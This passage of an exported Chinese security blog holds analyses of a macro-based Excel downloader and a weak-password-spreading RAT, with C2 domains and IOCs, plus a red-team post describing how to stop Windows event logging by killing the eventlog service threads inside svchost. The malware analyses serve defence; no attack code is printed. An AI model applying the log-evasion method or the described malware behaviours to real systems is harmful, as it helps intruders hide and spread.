id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>带有恶意宏的office文件，加载dll，下载程序执行</p>\n<h2 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h2><p><img src=\"https://img-blog.csdnimg.cn/20190920145944891.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"详细分析\"><a href=\"#详细分析\" class=\"headerlink\" title=\"详细分析\"></a>详细分析</h2><p>有宏，会在你允许宏运行的时候执行起来<br><img src=\"https://img-blog.csdnimg.cn/20190918202734525.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>首先会切换目录到<code>TMPT</code>下</p>\n<p>然后会调用窗体<code>UserFrom1</code>的<code>Show</code>方法,也就值展示提示窗体<br><img src=\"https://img-blog.csdnimg.cn/20190918202835482.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>在展示的时候会执行<code>UserFrom_Activate()</code>函数，也就会调用<code>CreatGifFile</code>这个方法<br><img src=\"https://img-blog.csdnimg.cn/20190918202716893.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这个方法在模块 modle1中定义<br><img src=\"https://img-blog.csdnimg.cn/20190918203052154.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>拼接在<code>TEMP</code>下的路径，根据系统位数走不同分支，我这里是win7 32位<br><img src=\"https://img-blog.csdnimg.cn/20190918203729411.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>下面会拷贝本身到上面拼接好的路径 <code>TempName</code>中，然后复制到<code>ZipName</code>中<br><img src=\"https://img-blog.csdnimg.cn/20190918205110760.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>会把<code>ZipName</code>文件按压缩包打开，取出<code>xl\\embeddings\\oleObject1.bin</code>保存到<code>Tmp\\oleObject.bin</code>中<br><img src=\"https://img-blog.csdnimg.cn/20190918205329214.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190918205648726.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>最后会调用<code>ReadAndWriteExtractedBinFile</code>函数，这个函数是在<code>oleObject.bin</code>中找到MZ开头的字符区，然后读取指定字节保存<br><img src=\"https://img-blog.csdnimg.cn/20190918210305935.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>定义好MZ头标记，方便后面查找<br><img src=\"https://img-blog.csdnimg.cn/20190918210330686.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>循环查找<code>oleObject.bin</code>中MZ开头的数据，然后拷贝到<code>NewAr</code>数组中<br><img src=\"https://img-blog.csdnimg.cn/20190918210842310.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>将数组中的数据保存到<code>nm</code>中，也就是 <code>%APPDATA %+\\exchange1.dll</code></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190918211005818.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>然后程序返回<code>CreateGifFile</code>来执行关键代码，<code>k32LL</code>和<code>Amway</code> 都在模块2中定义<br><img src=\"https://img-blog.csdnimg.cn/20190918211226396.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><code>k32LL()</code>其实是C语言中的<code>LoadLibraryW()</code><br><code>Amway</code>则是这个dll的一个导出函数</p>\n<h3 id=\"exchange1-dll\"><a href=\"#exchange1-dll\" class=\"headerlink\" title=\"exchange1.dll\"></a>exchange1.dll</h3><p>有壳，先脱壳，这里就说说思路</p>\n<p>这个壳动态开辟空间，将加密的代码放到这个新开空间中，找准时机，dump出来</p>\n<p>然后你会发现还有UPX的壳，UPX就是容易了</p>\n<p>脱完壳之后看导出表<br><img src=\"https://img-blog.csdnimg.cn/20190919212420668.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>到这里就可以看出来<code>Amway</code>其实是这个dll的到导出函数了</p>\n<p><strong>这个dll是个下载器，能够下载程序执行</strong></p>\n<p>但是首先会获取一系列系统信息</p>\n<p>获取主机名<br><img src=\"https://img-blog.csdnimg.cn/20190919212558142.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>获取用户名<br><img src=\"https://img-blog.csdnimg.cn/20190919212740460.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>获取系统版本信息<br><img src=\"https://img-blog.csdnimg.cn/20190919212819680.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>枚举进程<br><img src=\"https://img-blog.csdnimg.cn/20190919212846287.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>然后将进程名按 <code>|</code>号隔开<br><img src=\"https://img-blog.csdnimg.cn/201909192130056.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>后面就开始构造上传数据头了<br><img src=\"https://img-blog.csdnimg.cn/20190919213616330.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>开始上传本机信息<br><img src=\"https://img-blog.csdnimg.cn/20190919213725137.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190919213759624.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>上传后会检测response的状态码是否是正常(200)<br><img src=\"https://img-blog.csdnimg.cn/20190919214012375.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>当上传配置后会get一个文件<br><img src=\"https://img-blog.csdnimg.cn/20190919214254175.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这里会创建一个<code>%temp%\\boots.exe</code>文件<br><img src=\"https://img-blog.csdnimg.cn/20190919214316698.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>打开文件，往里面写下载的数据<br><img src=\"https://img-blog.csdnimg.cn/20190919214453138.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>下面就是核心的地方了，新开一个进程，去执行这个下载的exe程序</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190919214602693.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>由于目前这个C2地址已经失效，无法获得下载数据，但是能肯定的是这个下载程序才是这个木马的核心，因为这个宏代码中没有用做任何持久化处理。</p>\n<h2 id=\"IOC\"><a href=\"#IOC\" class=\"headerlink\" title=\"IOC\"></a>IOC</h2><table>\n<thead>\n<tr>\n<th>域名</th>\n<th>类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://office-teml-en.com/tw\" target=\"_blank\" rel=\"noopener\">https://office-teml-en.com/tw</a></td>\n<td>C&amp;C</td>\n</tr>\n</tbody></table>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>该木马利用加载隐藏在xlsx中的dll来执行命令，根据不同系统释放不同文件，利用网络存储，可以随时改变攻击方式。<br>我们要时刻保持警惕，对未知文件保持怀疑的态度，安装安全软件。</p>\n"},{"title":"Window事件日志清理","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200315155137730.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200315155137730.png","_content":"\n\n\n### Window事件日志\n\n>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。\n>\n>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。\n\n### 基本思路\n\n\n\n1.遍历进程模块，筛选svchost\n\n2.遍历进程导入模块，是否有wevtsvc.dll模块，如果有，则进程为目标进程\n\n3.再次遍历进程的所有线程，获取每个线程句柄\n\n使用未导出函数`NtQueryInformationThread`获取线程的THREAD_BASIC_INFORMATION结构体信息，读取这个进程的数据ProcessTag，根据这个Tag来找到SC_SERVICE_TAG_QUERY.pBuffer，当这个为eventlog则是日志监控进程\n\n测试效果如下：\n\n将特定线程结束就可以停止记录了。\n\n<img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/1.gif\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n代码参考：https://github.com/QAX-A-Team/EventCleaner\n\n### NtQueryInformationThread\n\n获取到线程信息，这里主要是拿到线程的Tag，线程Tag从线程TEB中拿出\n\nx86 PPEB + 0xF60\n\nx64 PPEB + 0x1720 \n\n\n\n参考http://terminus.rewolf.pl/terminus/structures/ntdll/_TEB_x64.html\n\n### _I_QueryTagInformation\n\n这里根据tag来获取线程属性，也就是\n\n![image-20200315155137730](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200315155137730.png)\n\n\n\n**我修改后的代码**\n\nhttps://gitee.com/L0yy/log_cleaning","source":"_posts/windows清理日志.md","raw":"---\ntitle: Window事件日志清理\ntags: [ReadTeam]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200315155137730.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200315155137730.png\n\n---\n\n\n\n### Window事件日志\n\n>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。\n>\n>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。\n\n### 基本思路\n\n\n\n1.遍历进程模块，筛选svchost\n\n2.遍历进程导入模块，是否有wevtsvc.dll模块，如果有，则进程为目标进程\n\n3.再次遍历进程的所有线程，获取每个线程句柄\n\n使用未导出函数`NtQueryInformationThread`获取线程的THREAD_BASIC_INFORMATION结构体信息，读取这个进程的数据ProcessTag，根据这个Tag来找到SC_SERVICE_TAG_QUERY.pBuffer，当这个为eventlog则是日志监控进程\n\n测试效果如下：\n\n将特定线程结束就可以停止记录了。\n\n<img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/1.gif\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n代码参考：https://github.com/QAX-A-Team/EventCleaner\n\n### NtQueryInformationThread\n\n获取到线程信息，这里主要是拿到线程的Tag，线程Tag从线程TEB中拿出\n\nx86 PPEB + 0xF60\n\nx64 PPEB + 0x1720 \n\n\n\n参考http://terminus.rewolf.pl/terminus/structures/ntdll/_TEB_x64.html\n\n### _I_QueryTagInformation\n\n这里根据tag来获取线程属性，也就是\n\n![image-20200315155137730](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200315155137730.png)\n\n\n\n**我修改后的代码**\n\nhttps://gitee.com/L0yy/log_cleaning","slug":"windows清理日志","published":1,"date":"2020-03-18T01:56:51.266Z","updated":"2020-03-18T02:11:43.249Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw62z001lccuqx3wf869s","content":"<h3 id=\"Window事件日志\"><a href=\"#Window事件日志\" class=\"headerlink\" title=\"Window事件日志\"></a>Window事件日志</h3><blockquote>\n<p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>\n<p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>\n</blockquote>\n<h3 id=\"基本思路\"><a href=\"#基本思路\" class=\"headerlink\" title=\"基本思路\"></a>基本思路</h3><p>1.遍历进程模块，筛选svchost</p>\n<p>2.遍历进程导入模块，是否有wevtsvc.dll模块，如果有，则进程为目标进程</p>\n<p>3.再次遍历进程的所有线程，获取每个线程句柄</p>\n<p>使用未导出函数<code>NtQueryInformationThread</code>获取线程的THREAD_BASIC_INFORMATION结构体信息，读取这个进程的数据ProcessTag，根据这个Tag来找到SC_SERVICE_TAG_QUERY.pBuffer，当这个为eventlog则是日志监控进程</p>\n<p>测试效果如下：</p>\n<p>将特定线程结束就可以停止记录了。</p>\n<img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/1.gif\" srcset=\"/cray/img/loading.gif\" alt=\"1\" style=\"zoom:50%;\">\n\n\n\n<p>代码参考：<a href=\"https://github.com/QAX-A-Team/EventCleaner\" target=\"_blank\" rel=\"noopener\">https://github.com/QAX-A-Team/EventCleaner</a></p>\n<h3 id=\"NtQueryInformationThread\"><a href=\"#NtQueryInformationThread\" class=\"headerlink\" title=\"NtQueryInformationThread\"></a>NtQueryInformationThread</h3><p>获取到线程信息，这里主要是拿到线程的Tag，线程Tag从线程TEB中拿出</p>\n<p>x86 PPEB + 0xF60</p>\n<p>x64 PPEB + 0x1720 </p>\n<p>参考<a href=\"http://terminus.rewolf.pl/terminus/structures/ntdll/_TEB_x64.html\" target=\"_blank\" rel=\"noopener\">http://terminus.rewolf.pl/terminus/structures/ntdll/_TEB_x64.html</a></p>\n<h3 id=\"IQueryTagInformation\"><a href=\"#IQueryTagInformation\" class=\"headerlink\" title=\"IQueryTagInformation\"></a><em>I</em>QueryTagInformation</h3><p>这里根据tag来获取线程属性，也就是</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200315155137730.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200315155137730\"></p>\n<p><strong>我修改后的代码</strong></p>\n<p><a href=\"https://gitee.com/L0yy/log_cleaning\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/log_cleaning</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Window事件日志\"><a href=\"#Window事件日志\" class=\"headerlink\" title=\"Window事件日志\"></a>Window事件日志</h3><blockquote>\n<p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>\n<p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>\n</blockquote>\n<h3 id=\"基本思路\"><a href=\"#基本思路\" class=\"headerlink\" title=\"基本思路\"></a>基本思路</h3><p>1.遍历进程模块，筛选svchost</p>\n<p>2.遍历进程导入模块，是否有wevtsvc.dll模块，如果有，则进程为目标进程</p>\n<p>3.再次遍历进程的所有线程，获取每个线程句柄</p>\n<p>使用未导出函数<code>NtQueryInformationThread</code>获取线程的THREAD_BASIC_INFORMATION结构体信息，读取这个进程的数据ProcessTag，根据这个Tag来找到SC_SERVICE_TAG_QUERY.pBuffer，当这个为eventlog则是日志监控进程</p>\n<p>测试效果如下：</p>\n<p>将特定线程结束就可以停止记录了。</p>\n<img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/1.gif\" srcset=\"/cray/img/loading.gif\" alt=\"1\" style=\"zoom:50%;\">\n\n\n\n<p>代码参考：<a href=\"https://github.com/QAX-A-Team/EventCleaner\" target=\"_blank\" rel=\"noopener\">https://github.com/QAX-A-Team/EventCleaner</a></p>\n<h3 id=\"NtQueryInformationThread\"><a href=\"#NtQueryInformationThread\" class=\"headerlink\" title=\"NtQueryInformationThread\"></a>NtQueryInformationThread</h3><p>获取到线程信息，这里主要是拿到线程的Tag，线程Tag从线程TEB中拿出</p>\n<p>x86 PPEB + 0xF60</p>\n<p>x64 PPEB + 0x1720 </p>\n<p>参考<a href=\"http://terminus.rewolf.pl/terminus/structures/ntdll/_TEB_x64.html\" target=\"_blank\" rel=\"noopener\">http://terminus.rewolf.pl/terminus/structures/ntdll/_TEB_x64.html</a></p>\n<h3 id=\"IQueryTagInformation\"><a href=\"#IQueryTagInformation\" class=\"headerlink\" title=\"IQueryTagInformation\"></a><em>I</em>QueryTagInformation</h3><p>这里根据tag来获取线程属性，也就是</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200315155137730.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200315155137730\"></p>\n<p><strong>我修改后的代码</strong></p>\n<p><a href=\"https://gitee.com/L0yy/log_cleaning\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/log_cleaning</a></p>\n"},{"title":"弱口令横向传播","date":"2019-09-02T11:11:22.000Z","index_img":"https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_06ce32b998.jpg","banner_img":"https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_06ce32b998.jpg","_content":"\n@[toc]\n## 基本信息\n|FileName| FileType|MD5|Size|\n|--|--|--|--|\n| sample.exe | rat  |4D049BC19B03572EF8A00980050BAFFF|28160 bytes|\n\n## 简介\n此木马拥有横向传播能力扫描局域网主机，利用弱口令尝试登陆，上传运行自身，这样来传播。该木马会获取并上传被害者系统配置，方便进一步攻击，木马中有接收命令，执行命令的模块，也是这个木马的核心，达到执行作者发过来的命令\n该木马主要使用壳伪装自己，让安全软件不能找到敏感关键字符串，从而躲避安全软件的查杀。\n## 流程图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912201229272.png)\n\n\n## 详细分析\n程序加了两个壳，一个压缩壳UPX，一个Armadillo 都能用PEID插件脱掉\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912110554278.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091211080334.png)\n点击脱壳之后修复下导入表就好了，修复之后查壳效果\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912111234244.png)\n#### 静态分析\n导入函数\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912112624974.png)\n还有很多字符串就不列了，格式都是这种。\n从字符串中能看出，该样本有命令执行，联网，创建服务，处理资源数据，操作注册表的功能\n基本也就能猜测是释放资源段文件到新文件，然后加入服务启动，来达到启动的目的，下面看啊可能具体操作。\n####\t动态加IDA\n该样本定义大量局部变量，使用硬编码方式存储数据\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912113106227.png)\n移动到ascii上，右键char就可以看到字符了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912113423102.png)\n这里创了一个名为121212的互斥体，防止程序多开。\n\n尝试打开注册表项`HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services\\.Net CLR`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912114556853.png)\n第一次找不到值 直接退出\n接着就开始创建新线程\n\n程序中还有一个枚举资源的回调函数，但是并没有执行起来\n### 线程1\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912114858505.png)\n\n创建第一个线程\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912114930476.png)\n硬编码很多常用账户和弱口令密码\n下面看看怎么玩的\n\n首先通过`gethostname`获取主机信息,然后通过`gethostbyname`获取主机IP地址，这里默认是掩码为`24`的网段。\n\n使用弱口令爆破这个网段的每一台主机\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091213240296.png)\n分别遍历上面的UserName和PassWord表，调用`402A40()`函数进行爆破\n看看具体过程\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912130116130.png)\n先尝试连接一波服务器\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912130156139.png)\n连接好后开始往自生和目标主机的共享目录的的C、D、 E盘写入自身，也就是目前运行这个程序\n\n最后再使用`at` 让程序2分钟后执行\n\n就是这样，程序就开始了横向传播\n\n### 线程2 \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912140134565.png)\n创建第二个线程\n会获取当前日期与`20130221`比较 \n然后又会创建一个线程\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912140748479.png)\n继续看这个Rat线程，这个线程才是这个木马的核心，命令执行\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912141038643.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091214092223.png)\n会尝试连接`arwah.uy1433.com:8090`服务器\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912141724864.png)\n向C2发送配置信息，大致内容如下。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912142056932.png)\n这里还会调用`4036c8()`来接收命令，用于后面的使用，因为F5效果不理想，看看汇编。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912142409368.png)\n会使用`select`接收发来的数据\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091214260294.png)\n\n#### 远控功能1：下载文件执行\n当参数是0x10时，在本地根据开机时间创建一个临时目录，下载远程服务器的文件到这个文件中，然后执行这个程序\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912143533196.png)\n#### 远控功能2：清除运行记录\n这里会删除之前创建的服务，删除注册表键值对，并且下载一个程序，\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912144509224.png)\n删除相应值\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912145143590.png)\n#### 远控功能3：使用ie访问指定地址\n这个可以进行DDos攻击，或者展示广告页面给被害者。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912145226470.png)\n#### 远控功能4：攻击模块\n下面还有一个用来网络攻击的专用模块\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916152048725.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091615140094.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916151556490.png)\n其实上面所使用的User-Agent都已经能朔源到这是一个在2008年就存在的DDos攻击的模块\n\n\n### 线程3\n\n创建一个访问本地的线程，这个线程与线程2有相似的地方，代码重用很多\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912151723315.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912153059337.png)\n这里做个猜想，这个木马是有目的的，已经在内网环境中有一台ip为`192.168.1.107`的主机已经被感染，这里说他说是服务器,然后这些被感染的主机都往这个服务器发送消息，接收执行命令。而这个线程就是来收集信息的。\n## 样本溯源\narwah.uy1433.com:8090\n192.168.1.107\n## 查杀方案\n结束该进程\n删除木马文件\n## 总结\n这个马是有目的性的，攻击目标应该不是面向普通用户，需要和服务器配合，而且木马没有持久化攻击模块，也就是说重启后就没有了，影响不是很大。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/利用弱口令传播横向的远控组件.md","raw":"---\ntitle: 弱口令横向传播\ndate: 2019-09-02 19:11:22\nindex_img: https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_06ce32b998.jpg\nbanner_img: https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_06ce32b998.jpg\ntags:\n    - malware Rat\ncategories: 样本详细分析\n---\n\n@[toc]\n## 基本信息\n|FileName| FileType|MD5|Size|\n|--|--|--|--|\n| sample.exe | rat  |4D049BC19B03572EF8A00980050BAFFF|28160 bytes|\n\n## 简介\n此木马拥有横向传播能力扫描局域网主机，利用弱口令尝试登陆，上传运行自身，这样来传播。该木马会获取并上传被害者系统配置，方便进一步攻击，木马中有接收命令，执行命令的模块，也是这个木马的核心，达到执行作者发过来的命令\n该木马主要使用壳伪装自己，让安全软件不能找到敏感关键字符串，从而躲避安全软件的查杀。\n## 流程图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912201229272.png)\n\n\n## 详细分析\n程序加了两个壳，一个压缩壳UPX，一个Armadillo 都能用PEID插件脱掉\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912110554278.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091211080334.png)\n点击脱壳之后修复下导入表就好了，修复之后查壳效果\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912111234244.png)\n#### 静态分析\n导入函数\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912112624974.png)\n还有很多字符串就不列了，格式都是这种。\n从字符串中能看出，该样本有命令执行，联网，创建服务，处理资源数据，操作注册表的功能\n基本也就能猜测是释放资源段文件到新文件，然后加入服务启动，来达到启动的目的，下面看啊可能具体操作。\n####\t动态加IDA\n该样本定义大量局部变量，使用硬编码方式存储数据\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912113106227.png)\n移动到ascii上，右键char就可以看到字符了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912113423102.png)\n这里创了一个名为121212的互斥体，防止程序多开。\n\n尝试打开注册表项`HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services\\.Net CLR`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912114556853.png)\n第一次找不到值 直接退出\n接着就开始创建新线程\n\n程序中还有一个枚举资源的回调函数，但是并没有执行起来\n### 线程1\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912114858505.png)\n\n创建第一个线程\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912114930476.png)\n硬编码很多常用账户和弱口令密码\n下面看看怎么玩的\n\n首先通过`gethostname`获取主机信息,然后通过`gethostbyname`获取主机IP地址，这里默认是掩码为`24`的网段。\n\n使用弱口令爆破这个网段的每一台主机\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091213240296.png)\n分别遍历上面的UserName和PassWord表，调用`402A40()`函数进行爆破\n看看具体过程\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912130116130.png)\n先尝试连接一波服务器\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912130156139.png)\n连接好后开始往自生和目标主机的共享目录的的C、D、 E盘写入自身，也就是目前运行这个程序\n\n最后再使用`at` 让程序2分钟后执行\n\n就是这样，程序就开始了横向传播\n\n### 线程2 \n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912140134565.png)\n创建第二个线程\n会获取当前日期与`20130221`比较 \n然后又会创建一个线程\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912140748479.png)\n继续看这个Rat线程，这个线程才是这个木马的核心，命令执行\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912141038643.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091214092223.png)\n会尝试连接`arwah.uy1433.com:8090`服务器\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912141724864.png)\n向C2发送配置信息，大致内容如下。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912142056932.png)\n这里还会调用`4036c8()`来接收命令，用于后面的使用，因为F5效果不理想，看看汇编。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912142409368.png)\n会使用`select`接收发来的数据\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091214260294.png)\n\n#### 远控功能1：下载文件执行\n当参数是0x10时，在本地根据开机时间创建一个临时目录，下载远程服务器的文件到这个文件中，然后执行这个程序\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912143533196.png)\n#### 远控功能2：清除运行记录\n这里会删除之前创建的服务，删除注册表键值对，并且下载一个程序，\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912144509224.png)\n删除相应值\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912145143590.png)\n#### 远控功能3：使用ie访问指定地址\n这个可以进行DDos攻击，或者展示广告页面给被害者。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912145226470.png)\n#### 远控功能4：攻击模块\n下面还有一个用来网络攻击的专用模块\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916152048725.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091615140094.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916151556490.png)\n其实上面所使用的User-Agent都已经能朔源到这是一个在2008年就存在的DDos攻击的模块\n\n\n### 线程3\n\n创建一个访问本地的线程，这个线程与线程2有相似的地方，代码重用很多\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912151723315.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190912153059337.png)\n这里做个猜想，这个木马是有目的的，已经在内网环境中有一台ip为`192.168.1.107`的主机已经被感染，这里说他说是服务器,然后这些被感染的主机都往这个服务器发送消息，接收执行命令。而这个线程就是来收集信息的。\n## 样本溯源\narwah.uy1433.com:8090\n192.168.1.107\n## 查杀方案\n结束该进程\n删除木马文件\n## 总结\n这个马是有目的性的，攻击目标应该不是面向普通用户，需要和服务器配合，而且木马没有持久化攻击模块，也就是说重启后就没有了，影响不是很大。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"利用弱口令传播横向的远控组件","published":1,"updated":"2019-12-07T03:11:24.575Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw630001nccuqhwxyxe5d","content":"<p>@[toc]</p>\n<h2 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h2><table>\n<thead>\n<tr>\n<th>FileName</th>\n<th>FileType</th>\n<th>MD5</th>\n<th>Size</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>sample.exe</td>\n<td>rat</td>\n<td>4D049BC19B03572EF8A00980050BAFFF</td>\n<td>28160 bytes</td>\n</tr>\n</tbody></table>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>此木马拥有横向传播能力扫描局域网主机，利用弱口令尝试登陆，上传运行自身，这样来传播。该木马会获取并上传被害者系统配置，方便进一步攻击，木马中有接收命令，执行命令的模块，也是这个木马的核心，达到执行作者发过来的命令<br>该木马主要使用壳伪装自己，让安全软件不能找到敏感关键字符串，从而躲避安全软件的查杀。</p>\n<h2 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h2><p><img src=\"https://img-blog.csdnimg.cn/20190912201229272.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"详细分析\"><a href=\"#详细分析\" 